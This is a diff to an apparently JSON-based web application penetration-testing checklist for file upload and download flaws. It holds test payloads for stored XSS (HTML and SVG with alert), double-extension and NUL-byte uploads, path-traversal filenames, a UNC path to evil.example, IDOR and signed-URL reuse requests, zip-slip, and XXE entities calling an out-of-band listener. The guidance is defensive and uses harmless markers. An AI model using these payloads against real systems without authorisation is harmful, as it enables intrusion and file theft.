@@ -32,19 +32,25 @@
               "name": "GIF magic, HTML name",
               "kind": "note",
               "payload": "Filename: note.html\\nContent-Type: image/gif\\nBody: GIF89a\\n<script>alert(1)</script>",
-              "expect": "If stored and served as HTML, that is stored XSS. Repeat with .svg, .xml, .pdf."
+              "expect": "If stored and served as HTML, that is stored XSS. Repeat with .svg, .xml, .pdf.",
+              "category": "parser-differential",
+              "why": "The server must agree on extension, Content-Type, and magic bytes; a mismatch is the gap."
             },
             {
               "name": "Double extension",
               "kind": "note",
               "payload": "note.php.jpg\\nnote.jpg.php\\nnote.phtml\\nnote.aspx\\nnote.jsp\\nnote.html.jpg",
-              "expect": "Normalization must run before the allowlist. A stored .php on an executable origin is critical."
+              "expect": "Normalization must run before the allowlist. A stored .php on an executable origin is critical.",
+              "category": "technology-specific",
+              "why": "Legacy servers execute the last known extension, bypassing an extension allowlist."
             },
             {
               "name": "NUL and trailing dot",
               "kind": "note",
               "payload": "note.php%00.jpg\\nnote.php.\\nnote.php::$DATA\\nnote.PHP",
-              "expect": "Legacy IIS/PHP tricks. Confirm the stored name, not only the upload response."
+              "expect": "Legacy IIS/PHP tricks. Confirm the stored name, not only the upload response.",
+              "category": "encoding",
+              "why": "Trailing dots, spaces, and NUL bytes are normalised differently by the OS and the validator."
             }
           ]
         },
@@ -64,13 +70,17 @@
               "name": "Harmless marker script",
               "kind": "note",
               "payload": "<?php echo 'WAPT-UPLOAD-MARKER'; ?>\\n<% Response.Write(\"WAPT-UPLOAD-MARKER\") %>",
-              "expect": "Use a print-only marker, never a shell. If the URL prints the marker, stop and record."
+              "expect": "Use a print-only marker, never a shell. If the URL prints the marker, stop and record.",
+              "category": "baseline",
+              "why": "A benign script file confirms execution without a destructive payload."
             },
             {
               "name": "Served as HTML",
               "kind": "request",
               "payload": "GET /uploads/<id>/note.html HTTP/1.1\nHost: www.example.com\nConnection: close",
-              "expect": "Content-Type must not be text/html on the app origin. Isolated file origin or attachment is the secure case."
+              "expect": "Content-Type must not be text/html on the app origin. Isolated file origin or attachment is the secure case.",
+              "category": "browser-context",
+              "why": "A user-controlled body served as text/html on the app origin is stored-XSS-grade."
             }
           ]
         },
@@ -90,13 +100,18 @@
               "name": "SVG with script",
               "kind": "note",
               "payload": "<?xml version=\"1.0\"?>\\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\\n  <script>alert(1)</script>\\n</svg>",
-              "expect": "Upload as image.svg. Open the URL in the browser (not as <img>). Inline script on the app origin is the finding."
+              "expect": "Upload as image.svg. Open the URL in the browser (not as <img>). Inline script on the app origin is the finding.",
+              "category": "technology-specific",
+              "why": "SVG is XML plus script, so a stored SVG is a stored-XSS vector.",
+              "payload_ref": "svg-script"
             },
             {
               "name": "Content-Disposition",
               "kind": "request",
               "payload": "GET /uploads/<id>/image.svg HTTP/1.1\nHost: www.example.com\nConnection: close",
-              "expect": "attachment plus a non-HTML type, or a separate files origin, removes impact. nosniff should be set."
+              "expect": "attachment plus a non-HTML type, or a separate files origin, removes impact. nosniff should be set.",
+              "category": "browser-context",
+              "why": "Attachment Content-Disposition is the control that stops SVG/HTML being rendered in-line."
             }
           ]
         },
@@ -116,13 +131,18 @@
               "name": "Dot-dot filename",
               "kind": "note",
               "payload": "filename: ../../wapt-canary.txt",
-              "expect": "The stored object must stay inside the upload root. Also try ..%2f and ....//."
+              "expect": "The stored object must stay inside the upload root. Also try ..%2f and ....//.",
+              "category": "encoding",
+              "why": "A ../ filename writes outside the upload root if the path is not sanitised.",
+              "payload_ref": "upload-dotdot"
             },
             {
               "name": "Absolute and UNC",
               "kind": "note",
               "payload": "filename: /var/www/wapt-canary.txt\\nfilename: \\\\evil.example\\share\\wapt.txt",
-              "expect": "Absolute and UNC names must be rejected or stripped to the basename."
+              "expect": "Absolute and UNC names must be rejected or stripped to the basename.",
+              "category": "technology-specific",
+              "why": "Absolute and UNC paths are resolved by the storage layer, not the validator."
             }
           ]
         }
@@ -149,13 +169,17 @@
               "name": "Swap the file id",
               "kind": "request",
               "payload": "GET /files/2002 HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
-              "expect": "2002 belongs to B. Also /api/v1/files/2002 and /download?id=2002."
+              "expect": "2002 belongs to B. Also /api/v1/files/2002 and /download?id=2002.",
+              "category": "authorization-context",
+              "why": "Reading another user's file by id is download authorization failure."
             },
             {
               "name": "Signed URL reuse",
               "kind": "request",
               "payload": "GET /files/2002?token=<expired-or-A-token> HTTP/1.1\nHost: files.example.com\nConnection: close",
-              "expect": "A signed URL must die after expiry and must not authorize a different object id."
+              "expect": "A signed URL must die after expiry and must not authorize a different object id.",
+              "category": "authentication-context",
+              "why": "A signed URL that outlives its grant or is reusable off-account bypasses the check."
             }
           ]
         },
@@ -175,13 +199,17 @@
               "name": "Dot-dot on download",
               "kind": "request",
               "payload": "GET /download?file=../../wapt-canary.txt HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
-              "expect": "The canary is returned. Stop after one confirmed read. Also try %2e%2e%2f."
+              "expect": "The canary is returned. Stop after one confirmed read. Also try %2e%2e%2f.",
+              "category": "encoding",
+              "why": "A traversal in the download path reads files outside the intended directory."
             },
             {
               "name": "Double-encoded",
               "kind": "request",
               "payload": "GET /files/..%252f..%252fwapt-canary.txt HTTP/1.1\nHost: www.example.com\nCookie: session=<account-A>",
-              "expect": "Edge decodes once, origin decodes again."
+              "expect": "Edge decodes once, origin decodes again.",
+              "category": "encoding",
+              "why": "Two decode layers can resurrect a traversal after the first check."
             }
           ]
         },
@@ -201,13 +229,17 @@
               "name": "Traversal entry name",
               "kind": "note",
               "payload": "zipinfo style entry: ../../wapt-canary.txt\\nAlso: ..\\\\..\\\\wapt-canary.txt",
-              "expect": "Build a tiny zip with that entry name and a harmless marker body. Extract must refuse or stay inside the root."
+              "expect": "Build a tiny zip with that entry name and a harmless marker body. Extract must refuse or stay inside the root.",
+              "category": "encoding",
+              "why": "A zip entry named ../ escapes the extraction root if entry names are not canonicalised."
             },
             {
               "name": "Symlink entry",
               "kind": "note",
               "payload": "A symlink entry pointing at /tmp/wapt-canary.txt or a file you own.",
-              "expect": "Must be refused. Do not point a symlink at /etc/passwd on a shared host."
+              "expect": "Must be refused. Do not point a symlink at /etc/passwd on a shared host.",
+              "category": "technology-specific",
+              "why": "A symlink entry can point extraction at arbitrary paths the extractor will follow."
             }
           ]
         },
@@ -227,17 +259,41 @@
               "name": "Classic external entity",
               "kind": "note",
               "payload": "<?xml version=\"1.0\"?>\\n<!DOCTYPE wapt [\\n  <!ENTITY xxe SYSTEM \"https://unique.oast.example/xxe\">\\n]>\\n<root>&xxe;</root>",
-              "expect": "Upload as .xml / .svg / .docx (word/document.xml). An outbound hit on your listener is the finding."
+              "expect": "Upload as .xml / .svg / .docx (word/document.xml). An outbound hit on your listener is the finding.",
+              "category": "out-of-band",
+              "why": "An external entity in uploaded XML triggers an out-of-band read to your listener."
             },
             {
               "name": "Parameter entity / DTD",
               "kind": "note",
               "payload": "<?xml version=\"1.0\"?>\\n<!DOCTYPE wapt [\\n  <!ENTITY % dtd SYSTEM \"https://unique.oast.example/xxe.dtd\">\\n  %dtd;\\n]>",
-              "expect": "Same listener check. Disable external DTD loading is the control."
+              "expect": "Same listener check. Disable external DTD loading is the control.",
+              "category": "technology-specific",
+              "why": "Parameter entities and DTDs bypass naive entity filters in some parsers."
             }
           ]
         }
       ]
     }
-  ]
+  ],
+  "payloads": {
+    "svg-script": {
+      "id": "svg-script",
+      "category": "technology-specific",
+      "context": "SVG upload body",
+      "encoding": "none",
+      "purpose": "SVG is XML plus script, so a stored SVG is a stored-XSS vector.",
+      "safe": true,
+      "payload": "<?xml version=\"1.0\"?>\\n<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\">\\n  <script>alert(1)</script>\\n</svg>"
+    },
+    "upload-dotdot": {
+      "id": "upload-dotdot",
+      "category": "encoding",
+      "context": "Upload filename",
+      "encoding": "none",
+      "purpose": "A ../ filename writes outside the upload root if the path is not sanitised.",
+      "safe": true,
+      "payload": "filename: ../../wapt-canary.txt"
+    }
+  }
 }
